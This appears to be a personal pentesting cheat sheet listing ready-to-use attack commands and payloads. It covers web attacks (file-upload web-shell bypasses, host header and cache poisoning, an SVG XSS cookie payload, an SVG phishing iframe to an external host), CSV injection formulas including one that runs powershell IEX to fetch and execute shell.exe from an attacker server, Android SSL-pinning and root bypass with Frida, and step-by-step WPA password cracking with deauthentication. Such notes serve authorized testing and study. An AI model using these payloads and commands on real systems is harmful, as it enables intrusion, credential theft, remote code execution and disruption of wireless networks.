# CIA
	Integrity : data only change by auth.
	Avalability : Avalable data when user need.
	Confidentility : Data access by auth.
  
# Containt Discover
	dirb https://domain.com/ /usr/share/wordlists/dirb/big.txt
	gobuster -u http://fakebank.com -w wordlist.txt dir 
		
# directory Traversal
	dirb https://domain.com/ /usr/share/wordlists/wfuzz/vulns/dirTraversal-nix.txt
	
# ClickJacking
https://numberless-holddown.000webhostapp.com/clickjacking.php?url={url}
or
		
		<!DOCTYPE html>
		<html lang="en">
		<head>
		  <meta charset="UTF-8">
		</head>
		<body>
		  <iframe src="{url}" frameborder="0"></iframe>
		</body>
		</html>
		
# Weak SSL Ciphers
V1.0 & V1.1 is vulnerable

	nmap -Pn --script ssl-enum-ciphers {domain} -p {port}

# Host Header Poisoning
## Basic
	Change "Host" header 

## via middleware (for password reseting)
	Add X-Forwarded-Host: <domain.com>
https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
	
## via dangling markup
	Try "Host: domain.com" to "Host: domain.com:attacker.com"
https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup

# Web Caches Poisioning
## Via an unkeyed header
	This lab supports the X-Forwarded-Host header. 
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header
	
## Via an unkeyed cookie
	change cookies value.
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie
	
## Via multiple headers
	Add:
		X-Forwarded-Scheme:http
		X-Forwarded-Host: example.com
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers

# CORS Payload
	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md
	
# RCE
## Basic
	not delete @PNG
	Upload Php File
	
## via Content-Type restriction bypass
	Change "Content-Type" header
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
	
## via path traversal
	Change file name "test.php" to "..%2ftest.php"
https://www.youtube.com/watch?v=4R3PUhiFzS4
	
## via obfuscated file extension
	change file name filename="exploit.php%00.jpg"
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension
	
## via race condition
https://www.youtube.com/watch?v=mt0BN5pYHXI </br>
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
	
# No Rate Limit
## via brute force
	send request to intruder
## via Race Condition
	Send request to turbo
	add "race.py" payload
	add "test: %s" header in header

# SVG Payload
## Phising Attack

	<svg width="1500" height="1500"
	  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">

	  <foreignObject width="1500px" height="1500px">
		<iframe xmlns="http://www.w3.org/1999/xhtml" style="width: 1500px; height: 1500px;" src="https://numberless-holddown.000webhostapp.com/"/>
	  </foreignObject>
	</svg>

## XSS	
	
	<?xml version="1.0" standalone="no"?>
	<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

	<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
	   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
	   <script type="text/javascript">
		  alert(document.cookie);
	   </script>
	</svg>
	
# CSV Injection Payload

	DDE ("cmd";"/C calc";"!A0")A0
	@SUM(1+9)*cmd|' /C calc'!A0
	=10+20+cmd|' /C calc'!A0
	=cmd|' /C notepad'!'A1'
	=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
	=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
	=@MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!_xlbgnm.A1

# Adb Command
	adb root
	
## Download application from enumalator
	adb pull /data/app/{package-name} /{location}
	
## Install Application or transfer file
	adb push {file.path} {location}


# Android Apk VAPT

## Direct Start
	adb shell am start -n {package_name}/.{activity_name}
	
## App Manipulation
### Sign Apk

	keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

	java -jar .\apksigner.jar  sign --ks my-release-key.keystore app-debug.apk
	
## Insecure-data-storage
	find savedpref crenditial using adb
https://www.youtube.com/watch?v=x8keYIWFzbY
https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage

## BACKUP FLAG TRUE ENABLED
	go to AndroidManifest.xml and search "backup" if backup is not found or may be its true thats means its  vulnerable
	
## Exploiting Apps vulnerable to Janus (CVE-2017–13156)
A serious vulnerability in Android allows attackers to inject a DEX file into an APK file without affecting the signatures. (i.e. modify the code in applications without affecting their signatures.) </br>
We use apksigner tool to find the signature schemes used by the application</br>

	apksigner verify -verbose h5.apk
	
https://medium.com/mobis3c/exploiting-apps-vulnerable-to-janus-cve-2017-13156-8d52c983b4e0

## Sensitive Information in Application Memory (Memory Dump)
	frida-ps -U
	python3 fridump.py -U -s "UPCL Smart Billing"
	
	http://pentestcorner.com/fridump-android-examples/

## Frida Setup
### Tools
1) Android Emulator API 32  </br>
2) BurpSuit 
### Install Frida in Android Emulator
adb push frida_server /data/local/tmp  </br>
adb push ca_cert /data/local/tmp

### package Name
frida-ps -Ua

### SSL Bypass
frida -U --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -f YOUR_BINARY </br>
Additional:  </br>
    objection -g pakage_name explore  </br>
    android sslpinning disable  </br>
    
### Root Bypass
frida -U --codeshare dzonerzy/fridantiroot -f YOUR_BINARY </br>
Additional:  </br>
objection -g pakage_name explore  </br>
android sslpinning disable  </br>


# Wifi Password Hacking
	

	Step 1:

	Put your wireles lan card on monitor mode

	 airmon-ng start "wireless lan card name"
	=> airmon-ng start wlan0

	Step 2:

	Capture Traffic with Airodump-ng

	airodump-ng "wireless lan card monitor mode"

	=> airodump-ng wlan0mon


	Step 3:

	Focus airodump-ng on one AP on One Channel

	 airodump-ng --bssid dummy -c dummy --write WPAcrack wlan0mon

	=> airodump-ng --bssid 8C:FD:18:88:79:68 -c 9 --write WPAcrack wlan0mon


	Step 4:

	in order to capture the encrypted password we need to have the client authenticate against AP.
	we do deauth signal to client

	 aireplay-ng --deauth 1000 -a bssid wlan0mon

	=> aireplay-ng --deauth 1000 -a 8C:FD:18:88:79:68 wlan0mon


	Step 5:

	Now we have to crack the dump file with aircrack-ng

	 aircrack-ng WPAcrack-01.cap -w (localtion of wordlist)
	 
# Password List For Pentesting 
## Mobile Number
	mobile_penetester_enumeration.txt
